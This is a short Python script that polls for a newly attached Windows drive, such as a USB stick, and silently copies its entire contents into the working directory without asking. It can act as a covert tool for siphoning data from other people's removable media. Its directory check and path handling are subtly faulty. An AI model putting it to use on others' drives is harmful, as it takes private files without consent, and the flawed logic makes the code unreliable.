import os
import shutil
from concurrent.futures import ThreadPoolExecutor


def cop(k):
    if os.path.isdir(k):
        shutil.copytree(f"{drive}://"+k+"//", os.getcwd() +
                        f"//{drive}//"+k+"//", dirs_exist_ok=True)
        return "Directory Copied"
    else:
        shutil.copy2(f"{drive}://"+k, os.getcwd()+f"//{drive}//"+k)
        return "File Copied"


def getDrives():
    ls = ['C']
    while True:
        d = ord(ls[-1])+1
        if not os.path.isdir(f"{chr(d)}"+":"):
            break
        ls.append(f"{chr(ord(ls[-1])+1)}")
    return ls


if __name__ == '__main__':
    ls = getDrives()
    while True:
        print(ls)
        print(getDrives())
        if len(ls) < len(getDrives()):
            hs = getDrives()
            with ThreadPoolExecutor() as e:
                global drive
                drive = hs[-1]
                res = e.map(cop, os.listdir(hs[-1]+":\\"))
                for i in res:
                    print(i)

        ls = getDrives()
